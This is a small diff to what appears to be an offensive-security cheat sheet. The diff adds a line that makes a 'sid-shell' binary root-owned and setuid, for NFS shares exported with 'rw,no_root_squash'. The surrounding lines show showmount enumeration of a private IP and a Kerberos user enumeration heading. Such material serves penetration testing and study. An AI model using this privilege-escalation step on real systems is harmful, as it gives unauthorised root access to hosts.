@@ -34,6 +34,7 @@ curl -vX $TARGET
 List NFS exported shares. If 'rw,no_root_squash' is present, upload and execute [sid-shell](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
 ```bash
 showmount -e 192.168.110.102
+chown root:root sid-shell; chmod +s sid-shell
 ```
 
 #### Kerberos User Enumeration
